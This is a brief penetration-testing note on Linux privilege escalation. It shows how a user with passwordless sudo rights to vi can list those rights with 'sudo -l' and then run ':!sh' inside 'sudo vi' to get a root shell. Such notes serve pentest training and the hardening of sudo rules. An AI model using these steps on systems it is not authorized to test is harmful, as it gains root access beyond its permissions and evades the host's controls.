---
tags:
  - Penetration-Testing
  - Linux
  - PrivEsc
---
**If user can run VI Editor with sudo privileges, can use VI to launch shell**

## Steps
- **Enumerate user sudo privileges**
```bash
sudo -l
```
Looking for privileges to run VI as root without password

- **Run sudo vi**
- **Enter :!sh**
- **Press Enter for Shell**
